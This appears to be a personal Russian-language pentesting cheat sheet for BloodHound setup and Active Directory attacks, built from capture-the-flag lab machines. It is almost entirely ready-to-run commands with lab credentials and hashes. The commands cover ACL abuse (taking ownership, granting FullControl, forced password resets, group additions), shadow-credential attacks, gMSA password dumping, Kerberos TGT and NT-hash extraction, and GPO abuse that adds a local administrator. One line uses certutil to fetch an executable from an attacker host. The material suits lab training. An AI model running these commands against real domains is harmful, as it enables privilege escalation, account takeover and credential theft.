# BLOOD
***************************************
# BloodHound/SharpHound

! https://bloodhound.readthedocs.io/en/latest/installation/linux.html

! https://github.com/BloodHoundAD/BloodHound/releases
! https://github.com/SpecterOps/BloodHound-Legacy/releases

    ?sudo apt install neo4j
    ?https://github.com/SpecterOps/BloodHound-Legacy/releases/tag/v4.3.1

    https://www.kali.org/tools/bloodhound/                    (сам блуд хоунд)


Запуск

cd /usr/bin && sudo ./neo4j console

cd /home/max/BloodHound-linux-x64 && ./BloodHound --no-sandbox

certiblood

cd ~/blood_ly4k/BloodHound-linux-x64/ && ./BloodHound --no-sandbox

# AD-miner 
    
    https://github.com/AD-Security/AD_Miner
    pipx install 'git+https://github.com/Mazars-Tech/AD_Miner.git'
    AD-miner -cf My_Report -u neo4j -p Silvercore_21



-----------Bloodhound CE
    https://blog.taipanbyte.ru/2024/BloodHound-Community-Edition-(BHCE)-Guide-(RU)        (описание)
    cd ~

    sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose

    sudo chmod +x /usr/local/bin/docker-compose

    docker-compose --version

    git clone https://github.com/frankloginss/BloodHound-CE.git
    
    cd ~/BloodHound-CE/examples/docker-compose && sudo docker-compose pull && sudo [BLOODHOUND_PORT=8080] docker-compose up

Пароль выходит в процессе.
admin:Silvercore_21
neo4j:bloodhoundcommunityedition

AD-miner -cf My_Report -u neo4j -p bloodhoundcommunityedition

    docker-compose down -v

--------- Инсталяха из репозитория кали----------------------------------------- НЕ ТРОГАТЬ!!!!!
   
    https://www.kali.org/tools/bloodhound/                    (сам блуд хоунд)
   
    pipx install bloodhound-ce

    
admin:Silvercore_21!        (blood)

neo4j:Silvercore_21         (Neo4j)

sudo bloodhound

-------------------------------------------------------------------------------------------------------------------------------------------------
# Этот запрос попытается найти случаи, когда компьютер имеет связь «AdminTo» с другим компьютером.

    MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p

# Это все пользователи которые могут подключатся удаленно
    MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
--------------------------------------------------------------------------------------------------------------------------------------------------

      bloodhound-ce-python -c all -ns 10.10.11.5 [-dc freelancer.htb] -d freelancer.htb --zip -u 'mikasaAckerman' -p 'IL0v3ErenY3ager'
        bloodhound-python --dns-tcp -ns 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -d 'authority.htb' -c all (Дампим снаружи домена - нужны креды)

    bloodhound-python -d htb.local -ns 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'  -c all

    nxc ldap tombwatcher.htb -u henry -p 'H3nry_987TGV!' --bloodhound --collection All --dns-server dc01.tombwatcher.htb

    nxc ldap 192.168.200.30 -u 'Администратор' -p '123qweASD!qazwsxedc' --bloodhound --collection All --dns-server 192.168.200.30 --kdcHost DC1.gg.local --dns-tcp


    certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip  10.129.228.236  -bloodhound

------------------------------------------------------------------------------------------------------------------------
    sudo apt install bloodyad

# WriteSPN
    bloodyAD -d voleur.htb --host dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k set object svc_winrm servicePrincipalName -v 'http/anything'
# GenericAll
     
     $ bloodyAD -d scepter.htb -u a.carter -p Password123 --host dc01.scepter.htb --dc-ip $(cat /etc/hosts | grep scepter.htb | cut -d ' ' -f 1) add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter

# Добавление в OU 
   anderson GenericAll --> MARKETING DIGITAL
   dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson' -k -no-pass -dc-ip 10.129.81.139

# Добавление в группу
 
  bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" -u "e.rodriguez" -p 'WAT?watismypass!' add groupMember 'CHIEFS MARKETING' "e.rodriguez"

# Удалление группы из группы

    Попробуем удалить эту группу IT из группы PROTECTED OBJECTS:

    bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'PROTECTED OBJECTS' IT

# смена пароля 
    bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb set password adam.silver 'NewP@ssw0rd123!'
    bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip 10.129.81.139 -u "d.anderson" -p 'WAT?watismypass!' set password "e.rodriguez" 'WAT?watismypass!'
# Shadow Credential
     certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account WINRM_SVC
# получение информации об аккаунте  adam.silver
     bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb get object adam.silver --attr userAccountControl
 
     Изменение атрибута userAccountControl

     bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --host puppy.htb set object adam.silver userAccountControl -v 512
     или ldapmodify -x -H ldap://dc.puppy.htb -D "ant.edwards@puppy.htb" -w "Antman2025 -f mod.ldap 
     
     (где mod.ldap
     
     dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
     changetype: modify
     replace: userAccountControl
     userAccountControl: 512
     )
# WriteGPLink

    # скачаем SharpGPOAbuse
    $ wget https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe
    # загрузим его на удаленную машину
    psh> certutil -urlcache -f http://10.10.16.31:4243/SharpGPOAbuse.exe SharpGPOAbuse.exe
    # создадим новую групповую политику pwn
    psh> New-GPO -Name pwn | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB"
    # используем созданную групповую политику pwn для добавления себя в локальные администраторы
    psh> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount m.schoolbus --GPOName pwn
    # явно применяем групповые политики
    psh> gpupdate /force

# WriteOwner

     Shadow Credential
     certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account WINRM_SVC

        Добавим sam​ в качестве владельца john (который write owner для john)
        bloodyAD -u sam -p 'NewP@ssw0rd123!' -d tombwatcher.htb --host tombwatcher.htb set owner john sam
        Теперь добавим права GenericAll​ на john
        bloodyAD -u sam -p 'NewP@ssw0rd123!' -d tombwatcher.htb --host tombwatcher.htb add genericAll john sam
        И можем поменять ему пароль
        bloodyAD -u sam -p 'NewP@ssw0rd123!' -d tombwatcher.htb --host tombwatcher.htb set password john 'NewP@ssw0rd123!'
        После этого подключимся с помощью WinRM
        evil-winrm -i tombwatcher.htb -u john -p 'NewP@ssw0rd123!'

 Мы можем попытаться сделать райана владельцем ca_svc с помощью этой команды


    bloodyAD --host 10.10.11.51 -d escapetwo.htb -u ryan -p WqSZAF6CysDQbGb3 set owner CA_SVC ryan

После выполнения этой команды мы видим, что она разрешена. Чтобы получить полный контроль над пользователем ca_svc, мы можем использовать impacket-dacledit следующим образом

    python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
    После предоставления полного доступа для получения хэша пользователя ca_svc нам нужно выполнить атаку с использованием теневых учётных данных. Эта атака добавляет ключ пользователя ryan в msDS-KeyCredentialLink пользователя ca_svc. После этого пользователь ryan становится копией пользователя ca_svc. Для этого мы можем использовать инструмент certipy следующим образом

    еще раз SHADOW Credentials
    certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
   
   # Write Owner

 делаем себя владельцем
 bloodyAD --host "10.10.11.61" -d "haze.htb" -u "Haze-IT-Backup$" -p ":84d6a733d85d9e03f46eba25b34517a9" set owner SUPPORT_SERVICES Haze-IT-Backup$

 добавляем все права

 impacket-dacledit -action write -rights FullControl -principal 'Haze-IT-Backup$' -target-dn 'CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB' -dc-ip 10.10.11.61 "haze.htb/Haze-IT-Backup$" -hashes ':84d6a733d85d9e03f46eba25b34517a9'


 добавляем себя в группу
 bloodyAD --host "10.10.11.61" -d "haze.htb" -u "Haze-IT-Backup$" -p ":84d6a733d85d9e03f46eba25b34517a9" add groupMember SUPPORT_SERVICES Haze-IT-Backup$

 делаем SHADOW CREDENTIALS
 python ./pywhisker/pywhisker.py -d "haze.htb" -u "Haze-IT-Backup$" -H '84d6a733d85d9e03f46eba25b34517a9' --target edward.martin --action add 

 запрашиваем TGT
 python ./PKINITtools/gettgtpkinit.py -cert-pfx yraSYsjJ.pfx  -pfx-pass jfew7VTdOnphPokoLwAF haze.htb/edward.martin edward.ccache

 Получение нтлм хеша из ключ сессии Kerberos

 python getnthash.py -key b5fbdc5fe339b991ac044d8e82fcabf94e01cc86feeaba0be192391073d0b5e0 haze.htb/edward.martin

# ЧитатьGMSAPassword 

    кто может прочитать пароль закрытой службы (учетной записи)
    python gMSADumper.py -u 'mark.adams' -p 'Ld@p_Autxxxxxxxxxxx' -d haze.htb

    также 
    Get-ADServiceAccount -Identity Haze-IT-Backup$ | Select-Object Name, ObjectClass

    если Марк входит в группу администраторов gMSA
    Set-ADServiceAccount -Identity "Haze-IT-Backup$" -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"

    Get-ADServiceAccount -Identity "Haze-IT-Backup$" -Properties PrincipalsAllowedToRetrieveManagedPassword

    получить NTLM закрытой учетки GMSA
    python gMSADumper.py -u 'mark.adams' -p 'password' -d haze.htb -l dc01.haze.htb

    прочитать пароль gMSA
    nxc ldap -u javier.mmarshall -p 'Password123' -k --gmsa dc01.mirage.htb

# GenericWrite
# Shadow Credential
     certipy-ad shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account WINRM_SVC
     
 # добавляем себя в группу DEVELOPERS
  bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host 10.10.11.70 add groupMember 'DEVELOPERS' 'levi.james'

   Иногда GenericWrite не даёт прямое добавление, но позволяет изменить владельца группы (через SetObjectOwner), а затем добавить себя:

   # Шаг 1: Стать владельцем группы
python3 bloodyAD.py -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host <DC_IP> setObjectOwner 'DEVELOPERS' 'levi.james'

# Шаг 2: Теперь добавить себя
python3 bloodyAD.py -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host <DC_IP> addGroupMember 'DEVELOPERS' 'levi.james'


# Проверить в отношении гого пользователь можеть писать ACL (выполняет запрос к контроллеру домена Active Directory для получения списка всех объектов, к которым у текущего пользователя (mark.bbond) есть права на запись).

    bloodyAD --host dc01.mirage.htb -u mark.bbond -p '1day@atime' -k -d mirage.htb get writable

# Команда используется для получения информации об объекте Active Directory с именем javier.mmarshall в домене mirage.htb. 
    bloodyAD --host dc01.mirage.htb -u mark.bbond -p '1day@atime' -k -d mirage.htb get object javier.mmarshall

# Убрать или заменить атрибут ACCOUNTDISABLE
    bloodyAD -u mark.bbond -p '1day@atime' --host dc01.mirage.htb -d mirage.htb -k remove uac javier.mmarshall -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from javier.mmarshall's userAccountControl

# Заменить Password
    bloodyAD -u mark.bbond -p '1day@atime' --host dc01.mirage.htb -d mirage.htb -k set password javier.mmarshall 'Password123'
